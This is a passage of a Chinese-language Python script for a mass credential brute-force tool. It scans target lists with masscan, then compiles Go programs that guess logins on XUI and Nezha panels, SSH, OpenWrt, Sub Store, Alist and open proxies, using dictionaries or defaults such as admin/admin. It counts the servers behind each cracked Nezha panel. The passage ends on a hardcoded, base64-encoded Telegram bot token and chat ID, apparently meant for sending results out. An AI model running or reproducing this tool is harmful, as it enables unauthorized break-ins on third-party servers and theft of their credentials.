        base_url = f"{protocol}://{ip_port}"; session = requests.Session()
        login_url = base_url + "/api/v1/login"; payload = {"username": username, "password": password}
        try:
            requests.packages.urllib3.disable_warnings()
            res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if res.status_code == 200:
                try:
                    j = res.json(); is_login_success = False; auth_token = None
                    if "token" in j.get("data", {}): auth_token = j["data"]["token"]; is_login_success = True
                    if "nz-jwt" in res.headers.get("Set-Cookie", ""): is_login_success = True
                    if j.get("code") == 200 and j.get("message", "").lower() == "success": is_login_success = True
                    if is_login_success:
                        if auth_token: session.headers.update({"Authorization": f"Bearer {auth_token}"})
                        res_api = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
                        machine_count = 0
                        if res_api.status_code == 200:
                            data = res_api.json()
                            if isinstance(data, list): machine_count = len(data)
                            elif isinstance(data, dict) and "data" in data and isinstance(data["data"], list): machine_count = len(data["data"])
                        return result_line, (machine_count, "N/A", "N/A")
                except (json.JSONDecodeError, Exception):
                    if "oauth2" in res.text.lower(): return result_line, (0, 0, "登录页面")
                    return result_line, (0, 0, "分析失败")
        except requests.exceptions.RequestException: continue
    return result_line, (0, 0, "登录失败")

# =========================== 主脚本优化部分 ===========================
GO_EXEC = "/usr/local/go/bin/go"

def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
    if not os.path.exists(xlsx_file): print(f"⚠️  Excel文件 {xlsx_file} 不存在，跳过更新。"); return
    try:
        wb = load_workbook(xlsx_file); ws = wb.active
        server_count_col = ws.max_column + 1
        ws.cell(row=1, column=server_count_col, value="服务器总数")
        for row_idx in range(2, ws.max_row + 1):
            original_address = ws.cell(row=row_idx, column=1).value
            if original_address in analysis_data:
                analysis_result = analysis_data[original_address]
                if len(analysis_result) > 0:
                    ws.cell(row=row_idx, column=server_count_col, value=analysis_result[0])
        wb.save(xlsx_file); print("✅ 成功将哪吒面板分析结果写入Excel报告。")
    except Exception as e: print(f"❌ 更新Excel文件时发生错误: {e}")

def input_with_default(prompt, default):
    user_input = input(f"{prompt} (默认 {default})：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt} (默认 {default})：").strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str: return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_go_code(template_lines, **params):
    code = "\n".join(template_lines)
    code = code.replace("{semaphore_size}", str(params.get('semaphore_size', 100)))
    code = code.replace("{timeout}", str(params.get('timeout', 3)))
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in params.get('usernames', [])]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in params.get('passwords', [])]) + "}"
    code = code.replace("{user_list}", user_list).replace("{pass_list}", pass_list)
    if 'proxy_type' in params:
        creds_list = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in params.get('credentials', [])]) + "}"
        code = code.replace("{proxy_type}", params['proxy_type']).replace("{auth_mode}", str(params.get('auth_mode', 0))).replace("{creds_list}", creds_list)
    with open('xui.go', 'w', encoding='utf-8', errors='ignore') as f: f.write(code)

def compile_go_program():
    executable_name = "xui_executable";
    if sys.platform == "win32": executable_name += ".exe"
    print("--- 正在编译Go程序... ---")
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    try:
        process = subprocess.Popen([GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, 'xui.go'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=go_env)
        _, stderr = process.communicate(); stderr = stderr.decode('utf-8', 'ignore')
        if process.returncode != 0: raise subprocess.CalledProcessError(process.returncode, [GO_EXEC, 'build', '-o', executable_name, 'xui.go'], stderr=stderr)
        if stderr: print(f"--- ⚠️  Go编译器警告 ---\n{stderr}")
        print(f"--- ✅ Go程序编译成功: {executable_name} ---"); return executable_name
    except subprocess.CalledProcessError as e:
        print(f"--- ❌ Go 程序编译失败 ---\n返回码: {e.returncode}\n--- 错误输出 ---\n{e.stderr}\n--------------------------"); sys.exit(1)

def adjust_oom_score():
    if sys.platform != "linux": return
    try:
        pid = os.getpid(); oom_score_adj_path = f"/proc/{pid}/oom_score_adj"
        if os.path.exists(oom_score_adj_path):
            with open(oom_score_adj_path, "w") as f: f.write("-500")
            print("✅ 成功调整OOM Score，降低被系统杀死的概率。")
    except PermissionError: print("⚠️  调整OOM Score失败：权限不足。建议使用root用户运行以获得最佳稳定性。")
    except Exception as e: print(f"⚠️  调整OOM Score时发生未知错误: {e}")

def check_and_manage_swap():
    if sys.platform != "linux": return
    try:
        swap_info = psutil.swap_memory()
        if swap_info.total > 0: print(f"✅ 检测到已存在的Swap空间，大小: {swap_info.total / 1024 / 1024:.2f} MiB。"); return
        print("⚠️  警告：未检测到活动的Swap交换空间。在高负载下，这会极大地增加进程被系统杀死的风险。")
        if input("❓ 是否要创建一个2GB的临时Swap文件来提高稳定性？(y/N): ").strip().lower() == 'y':
            swap_file = "/tmp/autoswap.img"; print(f"--- 正在创建2GB Swap文件: {swap_file} (可能需要一些时间)... ---")
            if shutil.which("fallocate"): subprocess.run(["fallocate", "-l", "2G", swap_file], check=True)
            else: subprocess.run(["dd", "if=/dev/zero", f"of={swap_file}", "bs=1M", "count=2048"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["chmod", "600", swap_file], check=True); subprocess.run(["mkswap", swap_file], check=True); subprocess.run(["swapon", swap_file], check=True)
            atexit.register(cleanup_swap, swap_file)
            print(f"✅ 成功创建并启用了2GB Swap文件: {swap_file}\n   该文件将在脚本退出时自动被禁用和删除。")
    except Exception as e: print(f"❌ Swap文件管理失败: {e}\n   请检查权限或手动创建Swap。脚本将继续运行，但稳定性可能受影响。")

def cleanup_swap(swap_file):
    print(f"\n--- 正在禁用和清理临时Swap文件: {swap_file} ---")
    try:
        subprocess.run(["swapoff", swap_file], check=False); os.remove(swap_file); print("✅ 临时Swap文件已成功清理。")
    except Exception as e: print(f"⚠️  清理Swap文件失败: {e}")

def process_chunk(chunk_id, lines, executable_name, go_internal_concurrency, test_url):
    input_file = os.path.join(TEMP_PART_DIR, f"input_{chunk_id}.txt"); output_file = os.path.join(TEMP_XUI_DIR, f"output_{chunk_id}.txt")
    with open(input_file, 'w', encoding='utf-8') as f: f.write("\n".join(lines))
    try:
        run_env = os.environ.copy(); total_memory = psutil.virtual_memory().total
        mem_limit = int(total_memory * 0.70 / 1024 / 1024)
        run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"; run_env["GOGC"] = "50"; run_env["TEST_URL"] = test_url
        cmd = [f'./{executable_name}', input_file, output_file]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=run_env)
        for line_bytes in iter(process.stdout.readline, b''):
            line = line_bytes.decode('utf-8', 'ignore')
            if "Scanning SSH:" in line: print(line.strip().ljust(80), end='\r', flush=True)
        process.wait()
        if process.returncode != 0:
            if process.returncode in [-9, 137]: return (False, f"任务 {chunk_id} 被系统因内存不足而终止(OOM Killed)。")
            else: stderr_output = process.stdout.read().decode('utf-8', 'ignore'); return (False, f"任务 {chunk_id} 失败，返回码 {process.returncode}。\n错误信息:\n{stderr_output}")
        return (True, None)
    finally:
        if os.path.exists(input_file): os.remove(input_file)

def run_scan_in_parallel(lines, executable_name, python_concurrency, go_internal_concurrency, chunk_size, test_url):
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    print(f"--- 📦 已将 {len(lines)} 个目标分为 {len(chunks)} 个小任务块 ---")
    with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
        future_to_chunk_id = {executor.submit(process_chunk, i, chunk, executable_name, go_internal_concurrency, test_url): i for i, chunk in enumerate(chunks)}
        with tqdm(total=len(chunks), desc="处理任务块", unit="块") as pbar:
            for future in as_completed(future_to_chunk_id):
                chunk_id = future_to_chunk_id[future]
                try:
                    success, error_message = future.result()
                    if not success:
                        print(" " * 80, end='\r'); print(f"\n❌ {error_message}")
                        if "OOM" in error_message:
                            print("🚨 检测到OOM错误，正在中止所有任务..."); executor.shutdown(wait=False, cancel_futures=True)
                            raise SystemExit("内存不足，脚本已中止。请使用更低的并发数重试。")
                except Exception as exc: print(f'\n任务 {chunk_id} 执行时产生异常: {exc}')
                pbar.update(1)
    print("\n")

def merge_xui_files():
    merged_file = 'xui.txt';
    if os.path.exists(merged_file): os.remove(merged_file)
    with open(merged_file, 'w', encoding='utf-8') as outfile:
        for f in sorted(os.listdir(TEMP_XUI_DIR)):
            if f.startswith("output_") and f.endswith(".txt"):
                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile: shutil.copyfileobj(infile, outfile)

def run_ipcx(final_result_file, xlsx_output_file):
    if os.path.exists(final_result_file) and os.path.getsize(final_result_file) > 0:
        print("\n--- 🗺️  正在调用 ipcx.py 查询IP地理位置并生成Excel报告... ---")
        subprocess.run([sys.executable, 'ipcx.py', final_result_file, xlsx_output_file])

def clean_temp_files(template_mode):
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True); shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']:
        if os.path.exists(f):
            try: os.remove(f)
            except OSError: pass

def choose_template_mode():
    print("🚀 请选择爆破模式：\n1. XUI面板\n2. 哪吒面板\n3. SSH\n4. Sub Store\n5. OpenWrt/iStoreOS\n--- 代理模式 ---\n6. SOCKS5 代理\n7. HTTP 代理\n8. HTTPS 代理\n--- 其他面板 ---\n9. Alist 面板")
    while True:
        choice = input("输入 1-9 之间的数字（默认1）：").strip()
        if choice in ("", "1"): return 1
        elif choice == "2": return 2; elif choice == "3": return 6; elif choice == "4": return 7; elif choice == "5": return 8
        elif choice == "6": return 9; elif choice == "7": return 10; elif choice == "8": return 11; elif choice == "9": return 12
        else: print("输入无效，请重新输入。")

def select_proxy_test_target():
    print("\n--- 🎯 代理测试目标选择 ---\n1: IPIP.net (IP验证, 推荐)\n2: Google (全球, http)\n3: Xiaomi (中国大陆稳定, http)\n4: Baidu (中国大陆稳定, https)\n5: 自定义URL")
    default_target = "http://myip.ipip.net"
    while True:
        choice_str = input("请选择一个测试目标 (默认 1): ").strip()
        if choice_str in ["", "1"]: return default_target
        try:
            choice = int(choice_str)
            if choice == 2: return "http://www.google.com/generate_204"; elif choice == 3: return "http://connect.rom.miui.com/generate_204"; elif choice == 4: return "https://www.baidu.com"
            elif choice == 5:
                custom_url = input("请输入自定义测试URL: ").strip()
                if custom_url: return custom_url
                else: print("⚠️ 输入为空，使用默认目标。"); return default_target
            else: print("❌ 无效选择，请重新输入。")
        except ValueError: print("❌ 无效输入，请输入数字。")

def get_default_interface():
    try:
        result = subprocess.check_output(["ip", "route", "get", "8.8.8.8"], text=True, stderr=subprocess.DEVNULL); match = re.search(r'dev\s+(\S+)', result)
        if match: return match.group(1)
    except Exception:
        try:
            with open('/proc/net/route') as f:
                for line in f:
                    fields = line.strip().split()
                    if fields[1] == '00000000' and int(fields[3], 16) & 2: return fields[0]
        except Exception: return None
    return None

def check_environment(template_mode):
    import platform
    def run_cmd(cmd, check=True, quiet=False, extra_env=None):
        env = os.environ.copy()
        if extra_env: env.update(extra_env)
        stdout = subprocess.DEVNULL if quiet else None; stderr = subprocess.DEVNULL if quiet else None
        try:
            subprocess.run(cmd, check=check, stdout=stdout, stderr=stderr, env=env)
        except FileNotFoundError:
            print(f"❌ 命令未找到: {cmd[0]}。请确保该命令在您的系统PATH中。"); raise

    def is_in_china():
        print("\n    - 正在通过 ping google.com 检测网络环境...")
        try:
            command = ["ping", "-c", "1", "-W", "2", "google.com"]
            result = subprocess.run(
                command,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False
            )
            if result.returncode == 0:
                print("    - ✅ Ping 成功, 判断为海外服务器。")
                return False
            else:
                print("    - ⚠️  Ping 超时或失败, 判断为国内服务器, 将自动使用镜像。")
                return True
        except FileNotFoundError:
            print("    - ⚠️  未找到 ping 命令, 无法检测网络。将使用默认源。")
            return False

    if platform.system().lower() == "windows":
        print(">>> 🪟 检测到 Windows 系统, 跳过环境检测和依赖安装...\n")
        return
    print(">>> ⚙️  正在检查并安装依赖环境...")
    pkg_manager = ""
    if shutil.which("apt-get"):
        pkg_manager = "apt-get"
    elif shutil.which("yum"):
        pkg_manager = "yum"
    else:
        print("❌ 无法检测到 apt-get 或 yum。此脚本仅支持 Debian/Ubuntu 和 CentOS/RHEL 系列系统。")
        sys.exit(1)
    print(f"    - 检测到包管理器: {pkg_manager}"); UPDATED = False
    def ensure_packages(pm, packages):
        nonlocal UPDATED
        sys.stdout.write(f"    - 正在使用 {pm} 检查系统包..."); sys.stdout.flush()
        try:
            if not UPDATED and pm == "apt-get":
                run_cmd([pm, "update", "-y"], quiet=True)
                UPDATED = True
            run_cmd([pm, "install", "-y"] + packages, quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}"); sys.exit(1)
    ping_package = "iputils-ping" if pkg_manager == "apt-get" else "iputils"
    iproute_package = "iproute2" if pkg_manager == "apt-get" else "iproute"
    ensure_packages(pkg_manager, ["curl", ping_package, iproute_package, "nmap", "masscan", "ca-certificates", "tar"])
    in_china = is_in_china()
    required_py_modules = {'requests': 'requests', 'psutil': 'psutil', 'openpyxl': 'openpyxl', 'yaml': 'pyyaml', 'tqdm': 'tqdm', 'colorama': 'colorama'}
    missing_modules_import = []
    missing_modules_install = []
    for import_name, install_name in required_py_modules.items():
        try:
            __import__(import_name)
        except ImportError:
            missing_modules_import.append(import_name)
            missing_modules_install.append(install_name)
    if missing_modules_import:
        print(f"    - 检测到缺失的 Python 模块: {', '.join(missing_modules_import)}"); sys.stdout.write("    - 正在尝试使用 pip 自动安装..."); sys.stdout.flush()
        try:
            pip_help = subprocess.check_output([sys.executable, "-m", "pip", "install", "--help"], text=True, stderr=subprocess.DEVNULL)
            use_break = "--break-system-packages" in pip_help; pip_cmd = [sys.executable, "-m", "pip", "install"]
            if in_china:
                pip_cmd.extend(["-i", "https://pypi.tuna.tsinghua.edu.cn/simple"])
            if use_break:
                pip_cmd.append("--break-system-packages")
            pip_cmd.extend(missing_modules_install)
            run_cmd(pip_cmd, quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}")
            manual_cmd = f"{sys.executable} -m pip install {' '.join(missing_modules_install)}"
            if use_break:
                manual_cmd += " --break-system-packages"
            if in_china:
                manual_cmd += " -i https://pypi.tuna.tsinghua.edu.cn/simple"
            print(f"❌ 自动安装失败。请手动运行以下命令解决依赖问题后重试:\n{manual_cmd}")
            sys.exit(1)

    if pkg_manager == "apt-get":
        sys.stdout.write("    - 正在更新CA证书..."); sys.stdout.flush(); run_cmd(["update-ca-certificates"], quiet=True); print(" 完成")
    def get_go_version():
        if not os.path.exists(GO_EXEC): return None
        try:
            out = subprocess.check_output([GO_EXEC, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except: return None
    if not (get_go_version() and get_go_version() >= (1, 20)):
        print("--- ⚠️ Go环境不满足，正在自动安装... ---")
        urls = ["https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz", "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"]
        if not in_china:
            urls.reverse()
        GO_TAR_PATH, download_success = "/tmp/go.tar.gz", False
        for url in urls:
            print(f"    - 正在从 {url.split('/')[2]} 下载Go...")
            try:
                subprocess.run(["curl", "-#", "-Lo", GO_TAR_PATH, url], check=True)
                download_success = True
                break
            except Exception:
                print("      下载失败，尝试下一个源...")
        if not download_success:
            print("❌ Go安装包下载失败，请检查网络。")
            sys.exit(1)
        sys.stdout.write("    - 正在解压Go安装包..."); sys.stdout.flush()
        try:
            run_cmd(["rm", "-rf", "/usr/local/go"], quiet=True)
            run_cmd(["tar", "-C", "/usr/local", "-xzf", GO_TAR_PATH], quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}")
            sys.exit(1)
        os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    if in_china:
        go_env['GOPROXY'] = 'https://goproxy.cn,direct'
    if not os.path.exists("go.mod"):
        run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)
    required_pkgs = []
    if template_mode == 6:
        required_pkgs.append("golang.org/x/crypto/ssh")
    if template_mode in [9, 10, 11]:
        required_pkgs.append("golang.org/x/net/proxy")
    if required_pkgs:
        sys.stdout.write("    - 正在安装Go模块..."); sys.stdout.flush()
        for pkg in required_pkgs:
            try:
                run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
            except subprocess.CalledProcessError as e:
                print(f"\n❌ Go模块 '{pkg}' 安装失败。请检查网络或代理设置。")
                raise e
        print(" 完成")
    print(">>> ✅ 环境依赖检测完成 \n")

def load_credentials(template_mode, auth_mode=0):
    usernames, passwords, credentials = [], [], []
    if template_mode == 7: return ["2cXaAxRGfddmGz2yx1wA"], ["2cXaAxRGfddmGz2yx1wA"], []
    if template_mode == 12: return [], [], []
    if auth_mode == 1: return [], [], []
    if auth_mode == 2:
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"): print("❌ 错误: 缺少 username.txt 或 password.txt 文件。"); sys.exit(1)
        with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f: usernames = [line.strip() for line in f if line.strip()]
        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f: passwords = [line.strip() for line in f if line.strip()]
        if template_mode == 2:
            print("ℹ️  检测到哪吒面板模式，将自动过滤长度小于8的密码..."); original_pass_count = len(passwords)
            passwords = [p for p in passwords if len(p) >= 8 or p == 'admin']
            print(f"  - 过滤完成，保留了 {len(passwords)}/{original_pass_count} 个密码。")
            if not passwords: print("❌ 错误: 过滤后，密码字典中没有剩余的有效密码。"); sys.exit(1)
        if not usernames or not passwords: print("❌ 错误: 用户名或密码文件为空。"); sys.exit(1)
        return usernames, passwords, credentials
    if auth_mode == 3:
        if not os.path.exists("credentials.txt"): print("❌ 错误: 缺少 credentials.txt 文件。"); sys.exit(1)
        with open("credentials.txt", 'r', encoding='utf-8-sig', errors='ignore') as f: credentials = [line.strip() for line in f if line.strip() and ":" in line]
        if not credentials: print("❌ 错误: credentials.txt 文件为空或格式不正确。"); sys.exit(1)
        return usernames, passwords, credentials
    if input("❓ 是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower() == 'y': return load_credentials(template_mode, auth_mode=2)
    else:
        if template_mode == 8: usernames, passwords = ["root"], ["password"]
        else: usernames, passwords = ["admin"], ["admin"]
        return usernames, passwords, credentials

def get_vps_info():
    try:
        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10); response.raise_for_status(); data = response.json()
        return data.get('query', 'N/A'), data.get('country', 'N/A')
    except requests.exceptions.RequestException: return "N/A", "N/A"

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file): return "N/A"
    try:
        with open(config_file, 'r', encoding='utf-8') as f: config_data = yaml.safe_load(f)
        if isinstance(config_data, dict) and 'server' in config_data: return config_data['server']
    except Exception: return "N/A"
    return "N/A"

def parse_ip_port_from_line(line):
    line = line.strip(); match = re.search(r'//(?:[^@/]+@)?([^:/]+):(\d+)', line)
    if match: return match.group(1), match.group(2)
    match = re.search(r'^([^:\s]+):(\d+)', line)
    if match: return match.group(1), match.group(2)
    return None, None

def is_valid_ip(s): return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", s) is not None

def run_masscan_prescan(source_lines, masscan_rate):
    print("\n--- 🔍 正在执行 Masscan 预扫描 (精确模式) 以筛选活性IP:Port... ---")
    if not shutil.which("masscan"): print("  - ❌ 命令 'masscan' 未找到。已在环境检查中尝试安装，请检查系统环境。\n  - 跳过预扫描，将继续对所有原始目标进行扫描。"); return source_lines
    masscan_input_file = "masscan_prescan_input.tmp"; domain_lines, ip_port_to_original_line, lines_to_scan_count = [], {}, 0
    with open(masscan_input_file, 'w') as f:
        for line in source_lines:
            host, port = parse_ip_port_from_line(line.strip())
            if host and port:
                original_line = line.strip()
                if is_valid_ip(host):
                    f.write(f"{host} -p {port}\n")
                    if f"{host}:{port}" not in ip_port_to_original_line: ip_port_to_original_line[f"{host}:{port}"] = original_line
                    lines_to_scan_count += 1
                else: domain_lines.append(original_line)
    if lines_to_scan_count == 0: print("  - ⚠️  未在源文件中找到任何基于IP的目标进行扫描。"); return domain_lines
    masscan_output_file = "masscan_prescan_output.tmp"; detected_interface = get_default_interface()
    if not detected_interface:
        interface = input("  - ⚠️  无法自动检测网络接口, 请手动输入 (如 eth0): ").strip()
        if not interface: print("  - 未提供接口名称，跳过预扫描。"); return source_lines
    else:
        user_choice = input(f"  - 自动检测到网络接口: {detected_interface}。是否使用此接口？(Y/n/手动输入): ").strip().lower()
        if user_choice == 'n': print("  - 跳过预扫描。"); return source_lines
        elif user_choice in ['', 'y']: interface = detected_interface
        else: interface = user_choice
    print(f"  - 将对 {lines_to_scan_count} 个IP:Port对进行精确扫描。接口: {interface}, 速率: {masscan_rate} pps")
    try:
        if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
        masscan_cmd = ["masscan", "-iL", masscan_input_file, "--rate", str(masscan_rate), "-oG", masscan_output_file, "--interface", interface, "--wait", "0"]
        process = subprocess.Popen(masscan_cmd, stderr=subprocess.PIPE, text=True, encoding='utf-8', errors='ignore'); stderr_output = ""
        with tqdm(total=100, desc="Masscan 扫描中", unit="%") as pbar:
            for line in process.stderr:
                stderr_output += line; match = re.search(r"(\d+\.\d+)%.*ETA", line)
                if match: pbar.n = float(match.group(1)); pbar.refresh()
            pbar.n = 100; pbar.refresh()
        process.wait()
        if process.returncode != 0: raise subprocess.CalledProcessError(process.returncode, masscan_cmd, stderr=stderr_output)
    except Exception as e:
        print("\n  - ❌ Masscan 预扫描失败。")
        if isinstance(e, subprocess.CalledProcessError): print(f"  - Masscan 错误信息:\n-----------------------------------------\n{e.stderr or '没有捕获到具体的错误信息。'}\n-----------------------------------------")
        else: print(f"  - Python 错误: {e}")
        print("  - 将继续对所有原始目标进行扫描。"); return source_lines
    live_ip_lines = []
    if os.path.exists(masscan_output_file):
        with open(masscan_output_file, 'r') as f:
            for line in f:
                match = re.search(r"Host: ([\d\.]+) .*?Ports: (\d+)/open", line)
                if match:
                    ip_addr, port_str = match.group(1), match.group(2); live_target_key = f"{ip_addr}:{port_str}"
                    if live_target_key in ip_port_to_original_line: live_ip_lines.append(ip_port_to_original_line[live_target_key])
    try:
        if os.path.exists(masscan_input_file): os.remove(masscan_input_file)
        if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
    except OSError: pass
    final_targets = domain_lines + live_ip_lines
    print(f"--- ✅ Masscan 预扫描完成。筛选出 {len(live_ip_lines)} 个活性IP:Port，加上 {len(domain_lines)} 个域名，共计 {len(final_targets)} 个目标。---")
    return final_targets

if __name__ == "__main__":
    start = time.time(); interrupted = False
    TEMP_PART_DIR = "temp_parts"; TEMP_XUI_DIR = "xui_outputs"
    from datetime import datetime, timedelta, timezone
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8); time_str = beijing_time.strftime("%Y%m%d-%H%M")
    
    final_txt_file = ""; final_xlsx_file = ""
    total_ips = 0

    try:
        TEMPLATE_MODE = choose_template_mode()
        mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
        prefix = mode_map.get(TEMPLATE_MODE, "result")
        
        final_txt_file = f"{prefix}-{time_str}.txt"
        final_xlsx_file = f"{prefix}-{time_str}.xlsx"

        print("\n=== 💥 爆破一键启动 - 参数配置 💥 ===")
        use_masscan_prescan = input("❓ 是否启用 Masscan 预扫描以筛选活性IP？(y/N): ").strip().lower() == 'y'
        input_file = input_filename_with_default("请输入源文件名", "1.txt")
        if not os.path.exists(input_file): print(f"❌ 错误: 文件 '{input_file}' 不存在。"); sys.exit(1)
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f: all_lines = [line.strip() for line in f if line.strip()]
        total_ips = len(all_lines); print(f"--- 🎯 总计 {total_ips} 个目标 ---")
        
        check_environment(TEMPLATE_MODE)
        
        if use_masscan_prescan:
            print("ℹ️  提示：如果 Masscan 扫描结果为0，请尝试大幅降低扫描速率。")
            masscan_rate = input_with_default("请输入Masscan扫描速率(pps, 推荐 50000)", 50000)
            all_lines = run_masscan_prescan(all_lines, masscan_rate); total_ips = len(all_lines)
            if not all_lines: print("🏁 预扫描后没有发现活性目标，脚本结束。"); sys.exit(0)
        
        print("\n--- 🚀 并发模型说明 ---\n脚本将启动多个并行的扫描进程（由Python控制），每个进程内部再使用多个线程（由Go控制）进行扫描。")
        cpu_cores = os.cpu_count() or 1; recommended_py_concurrency = cpu_cores * 2
        python_concurrency = input_with_default(f"请输入Python并发任务数 (推荐 {recommended_py_concurrency})", recommended_py_concurrency)
        go_internal_concurrency = input_with_default("请输入每个任务内部的Go并发数 (推荐 100)", 100)
        chunk_size = input_with_default("请输入每个小任务处理的IP数量", 500)
        params = {'semaphore_size': go_internal_concurrency}; params['timeout'] = input_with_default("超时时间(秒)", 3)
        params['test_url'] = "http://myip.ipip.net"
        if TEMPLATE_MODE in [9, 10, 11]:
            params['test_url'] = select_proxy_test_target()
            if TEMPLATE_MODE == 11 and not params['test_url'].startswith("https://"): print("\n[警告] 您正在使用HTTP测试目标来测试HTTPS代理，这很可能会失败。")
        nezha_analysis_threads = 0
        if TEMPLATE_MODE == 2: nezha_analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)
        AUTH_MODE = 0
        if TEMPLATE_MODE in [9, 10, 11]:
            print("\n请选择代理凭据模式：\n1. 无凭据\n2. 独立字典 (username.txt, password.txt)\n3. 组合凭据 (credentials.txt)")
            while True:
                auth_choice = input("输入 1, 2, 或 3 (默认 1): ").strip()
                if auth_choice in ["", "1"]: AUTH_MODE = 1; break
                elif auth_choice == "2": AUTH_MODE = 2; break
                elif auth_choice == "3": AUTH_MODE = 3; break
                else: print("输入无效。")
            if TEMPLATE_MODE == 9: params['proxy_type'] = "socks5"; elif TEMPLATE_MODE == 10: params['proxy_type'] = "http"; elif TEMPLATE_MODE == 11: params['proxy_type'] = "https"
        params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
        params['auth_mode'] = AUTH_MODE
        
        import psutil, requests, yaml; from openpyxl import Workbook, load_workbook; from tqdm import tqdm
        adjust_oom_score(); check_and_manage_swap()
        os.makedirs(TEMP_PART_DIR, exist_ok=True); os.makedirs(TEMP_XUI_DIR, exist_ok=True)
        template_map = {1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES, 6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES, 8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES, 10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES, 12: ALIST_GO_TEMPLATE_LINES}
        generate_go_code(template_map[TEMPLATE_MODE], **params)
        executable = compile_go_program()
        generate_ipcx_py()
        run_scan_in_parallel(all_lines, executable, python_concurrency, go_internal_concurrency, chunk_size, params['test_url'])
        merge_xui_files()
        if os.path.exists("xui.txt"): os.rename("xui.txt", final_txt_file); run_ipcx(final_txt_file, final_xlsx_file)
        if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            print(f"\n--- 📊 开始对成功的哪吒面板进行深度分析（使用 {nezha_analysis_threads} 线程）... ---")
            with open(final_txt_file, 'r', encoding='utf-8') as f: results = [line.strip() for line in f if line.strip()]
            nezha_analysis_data = {}
            with ThreadPoolExecutor(max_workers=nezha_analysis_threads) as executor:
                future_to_result = {executor.submit(analyze_panel, res): res for res in results}
                for future in tqdm(as_completed(future_to_result), total=len(results), desc="分析哪吒面板"):
                    result_line = future_to_result[future]
                    try: returned_line, analysis_result = future.result(); nezha_analysis_data[returned_line] = analysis_result
                    except Exception as exc: nezha_analysis_data[result_line] = ("分析异常", 0, "N/A")
            if nezha_analysis_data: update_excel_with_nezha_analysis(final_xlsx_file, nezha_analysis_data)
    except KeyboardInterrupt: print("\n>>> 🛑 用户中断操作（Ctrl+C），准备清理临时文件..."); interrupted = True
    except SystemExit as e:
        if str(e) not in ["0", "1"]: print(f"\n脚本因故中止: {e}"); interrupted = True
    except EOFError: print("\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。"); interrupted = True
    finally:
        clean_temp_files(TEMPLATE_MODE); cost = int(time.time() - start); run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
        if interrupted: print(f"\n===  脚本已被中断，中止前共运行 {run_time_str} ===")
        else: print(f"\n=== 🎉 全部完成！总用时 {run_time_str} ===")
        BOT_TOKEN_B64 = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ=="
        CHAT_ID_B64 = "NzY5NzIzNTM1OA=="
        try:
